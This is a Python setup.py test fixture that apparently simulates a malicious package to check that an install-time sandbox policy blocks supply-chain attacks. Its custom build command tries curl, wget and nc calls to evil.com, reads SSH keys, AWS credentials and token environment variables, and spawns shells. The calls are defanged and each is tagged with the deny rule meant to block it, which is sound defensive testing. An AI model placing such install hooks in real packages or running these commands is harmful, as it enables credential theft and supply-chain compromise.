# Test fixture: Simulates a malicious package that attempts multiple attack
# vectors during install. Used to verify pypi-install policy coverage under
# uv pip install. Each attempt is wrapped in try/except so the build continues
# and all vectors are exercised in a single run.
from setuptools import setup
from setuptools.command.build_py import build_py
import os
import socket
import subprocess
import sys

class MaliciousBuildPy(build_py):
    """Custom build command that exercises multiple supply-chain attack vectors."""
    def run(self):
        # 1. Command exfiltration — curl is denied by commands: deny:
        print("ATTACK: spawning curl", file=sys.stderr)
        try:
            subprocess.run(["curl", "-s", "https://evil.com/exfil"])
        except Exception:
            pass

        # 2. Command exfiltration — wget also denied
        print("ATTACK: spawning wget", file=sys.stderr)
        try:
            subprocess.run(["wget", "-q", "https://evil.com/exfil"])
        except Exception:
            pass

        # 3. Reverse shell — nc denied by commands: deny:
        print("ATTACK: spawning nc", file=sys.stderr)
        try:
            subprocess.run(["nc", "-z", "evil.com", "4444"])
        except Exception:
            pass

        # 4. Credential theft — read SSH key, denied by files: deny:
        print("ATTACK: reading SSH key", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
                f.read()
        except Exception:
            pass

        # 5. Credential theft — read AWS creds, denied by files: deny:
        print("ATTACK: reading AWS credentials", file=sys.stderr)
        try:
            with open(os.path.expanduser("~/.aws/credentials")) as f:
                f.read()
        except Exception:
            pass

        # 6. Env secret theft — denied by envvars: deny:
        print("ATTACK: reading env secrets", file=sys.stderr)
        try:
            os.environ.get("AWS_SECRET_ACCESS_KEY")
            os.environ.get("GITHUB_TOKEN")
        except Exception:
            pass

        # 7. Network exfiltration to non-PyPI host — denied by network: allow:
        print("ATTACK: connecting to evil.com", file=sys.stderr)
        try:
            socket.create_connection(("evil.com", 443), timeout=2)
        except Exception:
            pass

        # 8. DNS exfiltration — resolve suspicious domain
        print("ATTACK: DNS lookup for exfil domain", file=sys.stderr)
        try:
            socket.getaddrinfo("exfil.evil.com", 443)
        except Exception:
            pass

        # 9. Shell escape — bash denied by commands: deny:
        print("ATTACK: spawning bash", file=sys.stderr)
        try:
            subprocess.run(["bash", "-c", "id"])
        except Exception:
            pass

        # 10. Shell escape via os.system — denied by python: deny:
        print("ATTACK: os.system shell escape", file=sys.stderr)
        try:
            os.system("id")
        except Exception:
            pass

        # 11. Native code injection — denied by python: deny:
        print("ATTACK: ctypes native code injection", file=sys.stderr)
        try:
            import ctypes
            ctypes.CDLL("libc.dylib")
        except Exception:
            pass

        super().run()

setup(
    name="malicious-uv-pkg",
    version="0.1.0",
    packages=["malicious_uv_pkg"],
    cmdclass={"build_py": MaliciousBuildPy},
)
